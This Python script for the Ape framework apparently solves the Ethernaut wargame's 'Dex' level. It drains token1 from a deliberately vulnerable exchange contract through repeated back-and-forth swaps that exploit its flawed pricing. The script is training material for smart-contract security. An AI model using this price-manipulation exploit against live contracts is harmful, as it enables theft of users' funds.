from ape import accounts, project
from ..utils.helper import get_level_instance, level_completed, MAX_UINT256

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x9CB391dbcD447E645D6Cb55dE6ca23164130D008"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user, gas=9000000)

    contract = project.Dex.at(instance)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    token1 = contract.token1()
    token2 = contract.token2()

    with accounts.use_sender(user):
        # approve instance for token1 and token2
        contract.approve(instance, MAX_UINT256)
        # swap tokens back and forth to unbalance pool
        contract.swap(token1, token2, 10)
        print(
            f"\n--- We have {contract.balanceOf(token1, user)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
        )
        print(
            f"\n--- We have {contract.balanceOf(token2, user)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
        )

        contract.swap(token2, token1, 20)
        print(
            f"\n--- We have {contract.balanceOf(token1, user)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
        )
        print(
            f"\n--- We have {contract.balanceOf(token2, user)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
        )

        contract.swap(token1, token2, 24)
        print(
            f"\n--- We have {contract.balanceOf(token1, user)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
        )
        print(
            f"\n--- We have {contract.balanceOf(token2, user)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
        )

        contract.swap(token2, token1, 30)
        print(
            f"\n--- We have {contract.balanceOf(token1, user)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
        )
        print(
            f"\n--- We have {contract.balanceOf(token2, user)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
        )

        contract.swap(token1, token2, 41)
        print(
            f"\n--- We have {contract.balanceOf(token1, user)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
        )
        print(
            f"\n--- We have {contract.balanceOf(token2, user)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
        )

        contract.swap(token2, token1, 45)
        print(
            f"\n--- We have {contract.balanceOf(token1, user)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
        )
        print(
            f"\n--- We have {contract.balanceOf(token2, user)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
        )

    # assert we drained token1 from contract
    assert contract.balanceOf(token1, instance) == 0, "!drained"

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
